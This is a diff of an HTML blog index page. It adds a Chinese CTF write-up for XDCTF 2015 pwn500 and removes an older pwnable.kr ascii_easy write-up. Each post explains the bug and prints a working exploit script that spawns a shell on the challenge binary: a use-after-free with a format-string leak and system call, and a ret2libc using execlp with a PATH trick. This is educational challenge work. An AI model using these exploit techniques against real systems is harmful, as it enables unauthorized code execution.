@@ -298,6 +298,144 @@
             
               
                 
+                <a class="post-title-link" href="/2016/08/18/xdctf-qual-2015-pwn500/" itemprop="url">
+                  xdctf-qual-2015-pwn500
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-18T00:00:00+08:00" content="2016-08-18">
+              2016-08-18
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/18/xdctf-qual-2015-pwn500/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/18/xdctf-qual-2015-pwn500/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
+</blockquote>
+<h1 id="Conclusion">Conclusion</h1><p>分析的时候首先要把程序中用到的一些结构体的定义搞清楚，容易发现在<code>show score</code>中，会调用exam结构体的一个函数指针，看到这点比较容易想到利用UAF来修改这个函数指针完成一些事情。</p>
+<p>但是这个UAF的bug我找了好久也没发现在哪里，还是基本功太不扎实了，后来还是参考了<a href="https://github.com/sixstars/CTF/blob/master/2015/XDCTF/PWN/500/writeup/README.md" target="_blank" rel="external">@fdu-sixstars</a>的writeup</p>
+<p>关键在于在<code>free</code>一个essay后，如何让这个存放在exam结构体中的essay的指针不被清零（这样就可以通过cheat来修改essay），之后再次<code>take exam</code>时，使得刚<code>malloc</code>出来的用来存放exam结构体的内存与之前的essay为同一块地方，这样只要通过修改之前的essay，就可以达到修改刚获得的exam结构体的内容，从而利用<code>show score</code>，来实现任意函数的调用</p>
+<p>现在的问题就是如何使得essay指针不被清零，可以看看<code>resit</code>的代码(IDA反编译后)，程序是在判断exam结构体的essay的长度是否为0来决定要不要将<code>essay</code>置零</p>
+<p><img src="/images/xdctf-qual-2015-pwn500/1.jpg" alt=""></p>
+<p>在<code>exam</code>结构体中的函数指针所指向的用来获得score的代码如下所示，通过判断score是否小于60来决定要不要将essay释放。</p>
+<p><img src="/images/xdctf-qual-2015-pwn500/2.jpg" alt=""></p>
+<p>因此只要想办法使得我们输入essay后，在保证score低于60的情况下，仍能使得<code>essay+4</code>为0即可</p>
+<p>程序首先会将输入的字符串通过fputs函数放到stream里</p>
+<p><img src="/images/xdctf-qual-2015-pwn500/4.jpg" alt=""></p>
+<p>然后通过fread函数存放到essay中</p>
+<p><img src="/images/xdctf-qual-2015-pwn500/3.jpg" alt=""></p>
+<p>因此只要在输入的essay的开头放上一个<code>NULL</code>字符，即会被fputs截断，这样就可以成功使得<code>essay+4</code>为0</p>
+<p>到了这里后，接下去的思路就自己能很容易想出来了，利用printf函数的fsb漏洞，泄露栈上<code>libc_start_main_ret</code>的地址，然后通过<a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a>搜索libc，在得到了<code>system</code>函数地址后，利用<code>system(&quot;/bin/sh;junk&quot;)</code>这样的trick就可以成功getshel了</p>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./jwc'</span></span><br><span class="line">io      = zio(target, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'green'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">io.gdb_hint([<span class="number">0x401624</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># student                       (0xf0)</span></span><br><span class="line"><span class="comment"># name      0x00    -   0x0f    (0x10)</span></span><br><span class="line"><span class="comment"># intro     0x11    -   0xd8    (0xc8)</span></span><br><span class="line"><span class="comment"># math      0xe0    -   0xe7    (0x08)</span></span><br><span class="line"><span class="comment"># english   0xe8    -   0xef    (0x08)</span></span><br><span class="line"><span class="comment"># dota      0xf0    -   0xe7    (0x08)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exam                          (0x60)</span></span><br><span class="line"><span class="comment"># exam_type 0x00    -   0x03    (0x04)</span></span><br><span class="line"><span class="comment"># essay_len 0x04    -   0x07    (0x04)</span></span><br><span class="line"><span class="comment"># exam_size 0x08    -   0x0b    (0x04)</span></span><br><span class="line"><span class="comment"># essay_ptr 0x10    -   0x17    (0x08)</span></span><br><span class="line"><span class="comment"># score_fun 0x18    -   0x1f    (0x08)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># essay                         (size)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name, introduce)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'your name, no more than 16 chars'</span>)</span><br><span class="line">    io.writeline(name)</span><br><span class="line">    io.read_until(<span class="string">'with no more than 200 chars to introduce yourself'</span>)</span><br><span class="line">    io.writeline(introduce)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exam</span><span class="params">(idx, essay)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'3.dota'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'length of your essay?'</span>)</span><br><span class="line">    io.writeline(str(len(essay)))</span><br><span class="line">    io.read_until(<span class="string">'OK'</span>)</span><br><span class="line">    io.writeline(essay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resit</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line">    io.read_until(<span class="string">'3.dota'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cheat</span><span class="params">(idx, essay)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1024'</span>)</span><br><span class="line">    io.read_until(<span class="string">'here you can cheat :'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.writeline(essay)</span><br><span class="line"></span><br><span class="line">register(<span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'B'</span> * <span class="number">200</span>)</span><br><span class="line">exam(<span class="number">1</span>, <span class="string">'\x00'</span>.ljust(<span class="number">0x68</span>, <span class="string">'A'</span>))</span><br><span class="line">resit(<span class="number">1</span>)</span><br><span class="line">exam(<span class="number">2</span>, <span class="string">'\x00'</span>.ljust(<span class="number">0x68</span>, <span class="string">'A'</span>))</span><br><span class="line"></span><br><span class="line">plt_printf  = <span class="number">0x4009b0</span></span><br><span class="line">cheat(<span class="number">1</span>, <span class="string">'%11$lx'</span>.ljust(<span class="number">0x18</span>, <span class="string">'A'</span>) + l64(plt_printf))</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line">io.read_until(<span class="string">'math'</span>)</span><br><span class="line">io.read_line()</span><br><span class="line">adr_libc_start_main_ret = int(io.read(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">off_libc_start_main_ret = <span class="number">0x21ec5</span>   <span class="comment"># ./find __libc_start_main ec5; ./dump libc6_2.19-0ubuntu6.6_amd64</span></span><br><span class="line">adr_libc_base   = adr_libc_start_main_ret - off_libc_start_main_ret</span><br><span class="line">off_system      = <span class="number">0x46640</span></span><br><span class="line">adr_system      = off_system + adr_libc_base</span><br><span class="line">cheat(<span class="number">1</span>, <span class="string">'/bin/sh;'</span>.ljust(<span class="number">0x18</span>, <span class="string">'A'</span>) + l64(adr_system))</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h1 id="Reference">Reference</h1><p><a href="https://github.com/sixstars/CTF/blob/master/2015/XDCTF/PWN/500/writeup/README.md" target="_blank" rel="external">https://github.com/sixstars/CTF/blob/master/2015/XDCTF/PWN/500/writeup/README.md</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/08/17/xdctf-qual-2015-pwn200/" itemprop="url">
                   xdctf-qual-2015-pwn200
                 </a>
@@ -803,139 +941,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/11/pwnable-rookiss-ascii-easy/" itemprop="url">
-                  pwnable.kr-rookiss-ascii-easy
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-11T00:00:00+08:00" content="2016-08-11">
-              2016-08-11
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/11/pwnable-rookiss-ascii-easy/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/11/pwnable-rookiss-ascii-easy/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Trick">Trick</h1><p><code>ulimit -s unlimited</code> 禁用<strong>aslr</strong></p>
-<h1 id="Conclusion">Conclusion</h1><p><del>没有做出来，不过顺便翻了《Shellcode’s Handerbook》- Chapter 9 学习了下</del></p>
-<p>第二次来做，还是遇到了很多障碍，首先<code>system</code>的地址在计算出来后发现不是都是符合要求的字节，然后试了下<code>execve</code>发现可以</p>
-<p>接下来就是找字符串，刚开始试了<code>&#39;/bin/sh\x00&#39;</code>，都不符合要求。然后又试了<code>&#39;sh\x00&#39;</code>，也不符合要求，于是我就没辙了。再次求助google(即使是第二次来做也还是没做出来，心好累:(</p>
-<p>首先，<code>execlp</code>函数的原型为<code>int execlp(const char *file, const char *arg, ...);</code></p>
-<p>通过<code>man execv</code>，可以看到其中有一段对<code>execlp</code>函数的解释</p>
-<blockquote>
-<p>The execlp(), execvp(), and execvpe() functions duplicate the  actions  of  the  shell  in<br>searching  for  an  executable file if the specified filename does not contain a slash (/)<br>character.  The file is sought in the colon-separated list of directory  pathnames  speci-<br>fied  in  the  PATH  environment  variable.  If this variable isn’t defined, the path list<br>defaults to the current directory followed by the list of directories  returned  by  conf-<br>str(_CS_PATH).  (This confstr(3) call typically returns the value “/bin:/usr/bin”.)</p>
-</blockquote>
-<p>假使输入的<code>filename</code>不含<code>/</code>符号，就会采取和shell寻找可执行文件一样的方式去寻找这个文件，即遍历<strong>$PATH</strong>环境变量中的路径，在每个路径下尝试寻找<code>filename</code>文件</p>
-<p>因此只要将一个我们可写的路径加到PATH环境变量里，然后在这个路径下任意创建一个可以启动shell的文件，调整一个合适的文件名，使得能在内存中搜到这个文件名的字符串即可，这里选取了”h”文件名，在gdb中用<code>gdb$ find 0x5558b000,+0x1a6000,&quot;h&quot;</code>搜索该字符串，筛选符合要求的即可</p>
-<h1 id="Exploit">Exploit</h1><h2 id="log">log</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh ascii_easy@pwnable.kr -p2222</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line">ascii_easy@ubuntu:/tmp$ mkdir icemakrrr</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ cat &gt; h</span><br><span class="line"><span class="shebang">#!/bin/sh</span></span><br><span class="line">/bin/sh</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ <span class="built_in">export</span> PATH=/tmp/icemakrrr:<span class="variable">$PATH</span></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ <span class="built_in">ulimit</span> <span class="operator">-s</span> unlimited</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ cat &gt; exp.py</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">'/home/ascii_easy/ascii_easy'</span>)</span><br><span class="line"></span><br><span class="line">adr_execlp  = <span class="number">0</span>x55643970</span><br><span class="line">adr_filenm  = <span class="number">0</span>x55665c6c</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'A'</span> * <span class="number">0</span>xac</span><br><span class="line">payload += p32(adr_execlp)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(adr_filenm)</span><br><span class="line">payload += p32(<span class="number">0</span>x0)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">ascii_easy@ubuntu:/tmp/icemakrrr$ python exp.py</span><br><span class="line">[+] Starting program <span class="string">'/home/ascii_easy/ascii_easy'</span>: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Input text : triggering bug...</span><br><span class="line">$ <span class="built_in">cd</span></span><br><span class="line">$ cat flag</span><br><span class="line">damn you ascii armor... what a pain <span class="keyword">in</span> the ass!! :(</span><br><span class="line">$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<h2 id="exp-py">exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'/home/ascii_easy/ascii_easy'</span>)</span><br><span class="line"></span><br><span class="line">adr_execlp  = <span class="number">0x55643970</span> <span class="comment"># gdb$ p execlp</span></span><br><span class="line">adr_filenm  = <span class="number">0x55665c6c</span> <span class="comment"># find 0x5558b000,+0x1a6000,"h"</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'A'</span> * <span class="number">0xac</span></span><br><span class="line">payload += p32(adr_execlp)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(adr_filenm)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="Reference">Reference</h1><p><a href="http://werew.tk/article/12/ascii_easy-pwnablekr" target="_blank" rel="external">http://werew.tk/article/12/ascii_easy-pwnablekr</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -981,7 +986,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">27</span>
+              <span class="site-state-item-count">28</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
